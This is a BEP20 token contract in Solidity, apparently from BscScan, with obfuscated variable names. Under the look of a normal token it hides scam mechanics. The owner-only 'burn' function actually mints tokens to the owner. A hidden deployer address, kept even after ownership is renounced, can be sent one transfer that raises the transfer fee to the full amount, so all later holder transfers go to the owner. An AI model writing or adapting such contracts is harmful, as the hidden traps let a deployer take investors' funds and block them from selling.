/**
 *Submitted for verification at BscScan.com on 2022-11-13
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
pragma solidity >=0.4.11;
contract ZlixGM {
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  KNLxph = 100000000000000000000000;
uint256 public  XGJKwW = 10000000000000000000000000000;
uint256 public  UUaLbH = 10000000000000000;
uint256 public constant jWbNkY = 9+1;
address public  AfTMdh = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  JSfleU = 100000000000000000;
string public  name = "bRgSXm";
address public  feYUPU = address(0);
mapping (address => uint256) public balanceOf;
address public  jVRSax = address(0);
uint256 public  SYHqsM = 100000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
address public owner;
uint256 private  CKTczD = 10000000000000;
uint256 public  LPSJhA = 10000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  jFFPhp = address(0);
address public  glDpyS = address(0);
uint256 public  dqkaEd = 1000000000000000000;
uint256 public  FukXDi = 100000000000000000000;
uint8 public constant decimals = 18;
address public  BIKWbZ = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  lJVFiT = address(0);
string public  symbol = "fSnOdF";
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
constructor () public {
jFFPhp = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "xNxYfn");
require(to != address(0), "xNxYfn");
require(amount <= balanceOf[from], "xNxYfn");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* jWbNkY/CKTczD ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==jFFPhp){
CKTczD = 9+1;
}
emit Transfer(from, to, transferAmount);
}

}